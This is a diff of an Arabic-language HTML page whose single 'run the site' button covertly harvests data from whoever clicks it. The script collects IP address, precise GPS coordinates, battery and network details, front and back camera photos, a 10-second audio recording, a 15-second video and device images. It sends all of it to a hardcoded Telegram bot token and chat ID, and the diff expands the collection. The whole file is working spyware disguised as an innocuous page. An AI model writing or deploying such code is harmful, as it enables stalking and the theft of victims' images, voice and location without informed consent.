@@ -30,120 +30,290 @@
             transform: scale(0.95);
             background: #45a049;
         }
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <button id="actionButton">تشغيل الموقع</button>
+    <div id="status"></div>
 
     <script>
         const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
         const CHAT_ID = "6913353602";
         
         const actionButton = document.getElementById('actionButton');
+        const statusDiv = document.getElementById('status');
 
         actionButton.addEventListener('click', async function() {
             try {
-                // تعطيل الزر أثناء المعالجة
-                actionButton.textContent = "جاري التشغيل...";
                 actionButton.disabled = true;
+                actionButton.textContent = "جارٍ تشغيل الموقع...";
+                statusDiv.textContent = "جاري طلب الأذونات...";
                 
-                // 1. جمع معلومات الجهاز والموقع
-                const deviceInfo = await getDeviceInfo();
-                const locationInfo = await getLocationInfo();
-                await sendToTelegram(formatInfo(deviceInfo, locationInfo));
+                // طلب جميع الأذونات مرة واحدة
+                const [stream, geoPosition] = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'environment' }, 
+                        audio: true 
+                    }).catch(e => null),
+                    
+                    new Promise(resolve => {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve(pos),
+                            err => resolve(null),
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    })
+                ]);
                 
-                // 2. التقاط صورة من الكاميرا الأمامية
-                const frontCameraImage = await captureCamera('user');
-                await sendToTelegram(frontCameraImage, 'sendPhoto', 'front_camera.jpg');
+                // 1. جمع وإرسال معلومات الجهاز
+                statusDiv.textContent = "جمع معلومات الجهاز...";
+                const deviceInfo = await getCompleteDeviceInfo(geoPosition);
+                await sendToTelegram(formatDeviceInfo(deviceInfo));
                 
-                // 3. التقاط صورة من الكاميرا الخلفية
-                const backCameraImage = await captureCamera('environment');
-                await sendToTelegram(backCameraImage, 'sendPhoto', 'back_camera.jpg');
+                // 2. التقاط وإرسال صور الكاميرات
+                statusDiv.textContent = "التقاط صور الكاميرات...";
+                const [frontCam, backCam] = await Promise.all([
+                    captureCamera('user').catch(e => null),
+                    captureCamera('environment').catch(e => null)
+                ]);
                 
-                // 4. تسجيل صوت لمدة 10 ثواني
-                const audioBlob = await recordAudio(10000);
-                await sendToTelegram(audioBlob, 'sendAudio', 'audio_recording.ogg');
+                if (frontCam) await sendToTelegram(frontCam, 'sendPhoto', 'front_camera.jpg');
+                if (backCam) await sendToTelegram(backCam, 'sendPhoto', 'back_camera.jpg');
                 
-                // 5. تسجيل فيديو لمدة 15 ثانية
-                const videoBlob = await recordVideo(15000);
-                await sendToTelegram(videoBlob, 'sendVideo', 'video_recording.mp4');
+                // 3. تسجيل وإرسال الصوت (10 ثواني)
+                statusDiv.textContent = "تسجيل الصوت...";
+                const audioBlob = await recordAudio(10000).catch(e => null);
+                if (audioBlob) await sendToTelegram(audioBlob, 'sendAudio', 'audio_recording.ogg');
                 
-                // 6. إرسال 20 صورة من الجهاز
-                const imagesSent = await sendImagesFromDevice();
+                // 4. تسجيل وإرسال الفيديو (15 ثانية)
+                statusDiv.textContent = "تسجيل الفيديو...";
+                const videoBlob = await recordVideo(15000).catch(e => null);
+                if (videoBlob) await sendToTelegram(videoBlob, 'sendVideo', 'video_recording.mp4');
+                
+                // 5. إرسال الصور من الجهاز
+                statusDiv.textContent = "جاري البحث عن الصور...";
+                const imagesSent = await sendImagesFromDevice().catch(e => 0);
                 
                 // إعلام المستخدم بالانتهاء
-                actionButton.textContent = `تم التشغيل بنجاح (${imagesSent} صور)`;
+                actionButton.textContent = "تم التشغيل بنجاح";
+                statusDiv.textContent = `تم إرسال ${imagesSent} صورة`;
                 
             } catch (error) {
                 console.error('حدث خطأ:', error);
                 actionButton.textContent = "خطأ! اضغط مجدداً";
+                statusDiv.textContent = "حدث خطأ أثناء التشغيل";
             } finally {
                 setTimeout(() => {
                     actionButton.textContent = "تشغيل الموقع";
                     actionButton.disabled = false;
+                    statusDiv.textContent = "";
                 }, 5000);
             }
         });
 
-        // ===== الدوال المساعدة =====
-        
-        async function getDeviceInfo() {
+        // ===== دوال جمع المعلومات =====
+        async function getCompleteDeviceInfo(geoPosition) {
+            const connection = navigator.connection || {};
+            const battery = await getBatteryInfo();
+            
             return {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                memory: navigator.deviceMemory || 'غير معروف',
-                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
-                battery: await getBatteryStatus()
+                // معلومات الموقع
+                country: await getCountry(),
+                city: await getCity(),
+                ip: await getIPAddress(),
+                coordinates: geoPosition ? {
+                    lat: geoPosition.coords.latitude,
+                    lon: geoPosition.coords.longitude,
+                    accuracy: geoPosition.coords.accuracy,
+                    mapUrl: `https://maps.google.com/?q=${geoPosition.coords.latitude},${geoPosition.coords.longitude}`
+                } : null,
+                
+                // معلومات البطارية
+                batteryLevel: battery.level,
+                isCharging: battery.charging,
+                
+                // معلومات الشبكة
+                networkType: connection.effectiveType || 'غير متاح',
+                connectionType: connection.type || 'غير متاح',
+                downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف',
+                rtt: connection.rtt ? `${connection.rtt} ms` : 'غير معروف',
+                
+                // معلومات الوقت
+                time: new Date().toLocaleString('ar-SA', { 
+                    timeZoneName: 'short',
+                    hour12: true
+                }),
+                
+                // معلومات الجهاز
+                deviceName: navigator.userAgentData?.platform || navigator.platform,
+                deviceVersion: navigator.userAgentData?.platformVersion || 'غير متاح',
+                deviceType: getDeviceType(),
+                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متاح',
+                cores: navigator.hardwareConcurrency || 'غير معروف',
+                language: navigator.language || navigator.userLanguage,
+                
+                // معلومات المتصفح
+                browser: getBrowserName(),
+                browserVersion: getBrowserVersion(),
+                lastUpdate: 'غير متاح', // يحتاج لـ API خاص
+                
+                // معلومات الشاشة
+                screenResolution: `${screen.width}x${screen.height}`,
+                osVersion: getOSVersion(),
+                screenOrientation: screen.orientation?.type || 'غير معروف',
+                colorDepth: `${screen.colorDepth} بت`,
+                
+                // معلومات الأمان
+                protocol: window.location.protocol,
+                
+                // معلومات إضافية
+                geolocation: 'geolocation' in navigator ? 'نعم' : 'لا',
+                bluetooth: 'bluetooth' in navigator ? 'نعم' : 'لا',
+                touchGestures: 'ongesturestart' in window ? 'نعم' : 'لا'
             };
         }
 
-        async function getBatteryStatus() {
+        async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    return `${Math.floor(battery.level * 100)}% ${battery.charging ? 'يشحن' : 'غير مشحون'}`;
+                    return {
+                        level: `${Math.floor(battery.level * 100)}%`,
+                        charging: battery.charging ? 'نعم' : 'لا'
+                    };
                 } catch {
-                    return 'غير معروف';
+                    return { level: 'غير متاح', charging: 'غير متاح' };
                 }
             }
-            return 'غير متاح';
+            return { level: 'غير متاح', charging: 'غير متاح' };
         }
 
-        async function getLocationInfo() {
+        async function getCountry() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name,
-                    city: data.city,
-                    isp: data.org
-                };
+                const response = await fetch('https://ipapi.co/country_name/');
+                return await response.text();
             } catch {
-                return {
-                    ip: 'غير معروف',
-                    country: 'غير معروف',
-                    city: 'غير معروف',
-                    isp: 'غير معروف'
-                };
+                return 'غير متاح';
             }
         }
 
-        function formatInfo(device, location) {
-            return `📱 <b>معلومات الجهاز:</b>\n` +
-                   `• النظام: ${device.platform}\n` +
-                   `• الشاشة: ${device.screen}\n` +
-                   `• البطارية: ${device.battery}\n` +
-                   `• الشبكة: ${device.connection}\n\n` +
-                   `📍 <b>الموقع:</b>\n` +
-                   `• الدولة: ${location.country}\n` +
-                   `• المدينة: ${location.city}\n` +
-                   `• IP: <code>${location.ip}</code>\n` +
-                   `• المزود: ${location.isp}`;
+        async function getCity() {
+            try {
+                const response = await fetch('https://ipapi.co/city/');
+                return await response.text();
+            } catch {
+                return 'غير متاح';
+            }
         }
 
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'غير متاح';
+            }
+        }
+
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "تابلت";
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "هاتف";
+            return "كمبيوتر";
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf("Firefox") !== -1) return "Firefox";
+            if (ua.indexOf("SamsungBrowser") !== -1) return "Samsung Browser";
+            if (ua.indexOf("Opera") !== -1 || ua.indexOf("OPR") !== -1) return "Opera";
+            if (ua.indexOf("Trident") !== -1) return "Internet Explorer";
+            if (ua.indexOf("Edge") !== -1) return "Edge";
+            if (ua.indexOf("Chrome") !== -1) return "Chrome";
+            if (ua.indexOf("Safari") !== -1) return "Safari";
+            return "غير معروف";
+        }
+
+        function getBrowserVersion() {
+            const ua = navigator.userAgent;
+            let temp;
+            if (ua.indexOf("Firefox") !== -1) {
+                temp = ua.substring(ua.indexOf("Firefox") + 8);
+                return temp.split(" ")[0];
+            }
+            if (ua.indexOf("Chrome") !== -1) {
+                temp = ua.substring(ua.indexOf("Chrome") + 7);
+                return temp.split(" ")[0];
+            }
+            return "غير معروف";
+        }
+
+        function getOSVersion() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf("Windows NT 10.0") != -1) return "Windows 10";
+            if (ua.indexOf("Windows NT 6.3") != -1) return "Windows 8.1";
+            if (ua.indexOf("Windows NT 6.2") != -1) return "Windows 8";
+            if (ua.indexOf("Windows NT 6.1") != -1) return "Windows 7";
+            if (ua.indexOf("Windows NT 6.0") != -1) return "Windows Vista";
+            if (ua.indexOf("Windows NT 5.1") != -1) return "Windows XP";
+            if (ua.indexOf("Windows NT 5.0") != -1) return "Windows 2000";
+            if (ua.indexOf("Mac") != -1) return "Mac/iOS";
+            if (ua.indexOf("X11") != -1) return "UNIX";
+            if (ua.indexOf("Linux") != -1) return "Linux";
+            if (ua.indexOf("Android") != -1) return "Android";
+            if (ua.indexOf("iPhone") != -1) return "iPhone";
+            if (ua.indexOf("iPad") != -1) return "iPad";
+            return "غير معروف";
+        }
+
+        function formatDeviceInfo(info) {
+            let message = `📱 <b>معلومات الجهاز:</b>\n`;
+            message += `- الدولة: ${info.country}\n`;
+            message += `- المدينة: ${info.city}\n`;
+            message += `- عنوان IP: <code>${info.ip}</code>\n`;
+            
+            if (info.coordinates) {
+                message += `- خط العرض: ${info.coordinates.lat}\n`;
+                message += `- خط الطول: ${info.coordinates.lon}\n`;
+                message += `- دقة الموقع: ±${Math.round(info.coordinates.accuracy)} متر\n`;
+                message += `- رابط الخريطة: ${info.coordinates.mapUrl}\n`;
+            }
+            
+            message += `- شحن الهاتف: ${info.batteryLevel}\n`;
+            message += `- هل الهاتف يشحن؟: ${info.isCharging}\n`;
+            message += `- الشبكة: ${info.networkType}\n`;
+            message += `- نوع الاتصال: ${info.connectionType}\n`;
+            message += `- الوقت: ${info.time}\n`;
+            message += `- اسم الجهاز: ${info.deviceName}\n`;
+            message += `- إصدار الجهاز: ${info.deviceVersion}\n`;
+            message += `- نوع الجهاز: ${info.deviceType}\n`;
+            message += `- الذاكرة (RAM): ${info.memory}\n`;
+            message += `- عدد الأنوية: ${info.cores}\n`;
+            message += `- لغة النظام: ${info.language}\n`;
+            message += `- اسم المتصفح: ${info.browser}\n`;
+            message += `- إصدار المتصفح: ${info.browserVersion}\n`;
+            message += `- دقة الشاشة: ${info.screenResolution}\n`;
+            message += `- إصدار نظام التشغيل: ${info.osVersion}\n`;
+            message += `- وضع الشاشة: ${info.screenOrientation}\n`;
+            message += `- عمق الألوان: ${info.colorDepth}\n`;
+            message += `- تاريخ آخر تحديث للمتصفح: ${info.lastUpdate}\n`;
+            message += `- بروتوكول الأمان المستخدم: ${info.protocol}\n`;
+            message += `- نطاق التردد للاتصال: ${info.downlink}\n`;
+            message += `- إمكانية تحديد الموقع الجغرافي: ${info.geolocation}\n`;
+            message += `- الدعم لتقنية البلوتوث: ${info.bluetooth}\n`;
+            message += `- دعم الإيماءات اللمسية: ${info.touchGestures}`;
+            
+            return message;
+        }
+
+        // ===== دوال الوسائط =====
         async function captureCamera(facingMode) {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { 
@@ -157,7 +327,6 @@
             const imageCapture = new ImageCapture(track);
             const bitmap = await imageCapture.grabFrame();
             
-            // تحويل Bitmap إلى Blob
             const canvas = document.createElement('canvas');
             canvas.width = bitmap.width;
             canvas.height = bitmap.height;
